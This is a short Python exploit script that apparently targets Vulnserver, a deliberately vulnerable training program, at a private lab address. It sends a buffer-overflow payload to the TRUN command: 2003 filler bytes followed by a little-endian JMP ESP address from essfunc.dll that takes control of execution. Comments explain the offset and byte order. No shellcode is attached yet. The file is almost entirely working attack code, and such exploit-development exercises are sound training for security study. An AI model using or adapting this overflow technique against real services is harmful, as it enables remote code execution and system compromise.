#!/usr/bin/env python3
import sys
import socket

HOST = "172.16.19.132"
PORT = 9999

# 0x625011af

offset = b"A"*2003 + b"\xaf\x11\x50\x62"

# in x86 we have little endian format where you have all the bytes in reverse
# Hence this is just 2003 A's + address of instruction(JMP ESP)
# the address points to code of essfunc.dll which just reads FFE4 -> JMP ESP

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.sendall(b"TRUN /.:/" + offset)
    s.close()

except Exception:
    print("Error connecting to server")
    sys.exit()
